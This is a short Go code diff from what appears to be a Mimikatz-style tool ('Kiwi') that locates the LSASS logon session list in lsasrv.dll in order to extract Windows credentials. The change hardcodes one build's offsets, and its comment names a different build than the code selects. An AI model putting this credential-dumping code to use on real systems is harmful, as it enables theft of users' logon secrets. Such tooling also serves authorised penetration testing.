@@ -194,7 +194,11 @@ var (
 	}
 )
 
-func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
+func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle) error {
+
+	// buildWin10v1903
+	patch := lsaSrvReferencesX64[buildWin10v1507]
+
 	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
@@ -561,11 +565,11 @@ type LogonSession struct {
 	Credentials []*Credential
 }
 
-func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle, patch *patchGeneric) ([]*LogonSession, error) {
+func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle) ([]*LogonSession, error) {
 	kiwi.mu.Lock()
 	defer kiwi.mu.Unlock()
 	if kiwi.logonSessionListAddr == 0 {
-		err := kiwi.searchLogonSessionListAddress(pHandle, patch)
+		err := kiwi.searchLogonSessionListAddress(pHandle)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to search logon session list address")
 		}
